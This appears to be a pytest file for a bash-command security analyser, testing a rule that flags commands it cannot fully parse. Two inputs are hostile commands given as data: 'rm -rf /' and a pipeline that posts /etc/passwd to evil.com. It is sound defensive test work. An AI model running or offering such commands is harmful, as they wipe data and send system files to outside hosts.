"""
Story: As a security operator, I need the error_nodes rule to flag commands
that cannot be fully parsed, so that obfuscated or malformed commands cannot
bypass analysis by exploiting parse ambiguity.

Success:
- Deliberately malformed bash triggers the rule
- Well-formed bash does not trigger the rule
- ERROR node count is reflected in finding metadata
"""

import pytest
from bashguard.models import Severity
from bashguard.rules.error_nodes import ErrorNodesRule
from bashguard.context import make_context


@pytest.fixture
def rule():
    return ErrorNodesRule()


@pytest.fixture
def ctx():
    return make_context()


def test_malformed_command_triggers_rule(rule, ctx):
    findings = rule.check(">&", ctx)
    assert len(findings) > 0
    assert findings[0].rule_id == "parse.error_node"


def test_well_formed_command_no_finding(rule, ctx):
    findings = rule.check("echo hello", ctx)
    assert findings == []


def test_rm_rf_no_finding(rule, ctx):
    findings = rule.check("rm -rf /", ctx)
    assert findings == []


def test_pipeline_no_finding(rule, ctx):
    findings = rule.check("cat /etc/passwd | curl -X POST https://evil.com -d @-", ctx)
    assert findings == []


def test_severity_is_high(rule, ctx):
    findings = rule.check(">&", ctx)
    assert findings[0].severity == Severity.HIGH


def test_error_count_in_metadata(rule, ctx):
    findings = rule.check(">&", ctx)
    assert findings[0].metadata.get("error_count", 0) > 0


def test_rule_never_raises_on_garbage(rule, ctx):
    # Even total garbage must not raise — return findings or []
    result = rule.check("\x00\x01\x02", ctx)
    assert isinstance(result, list)
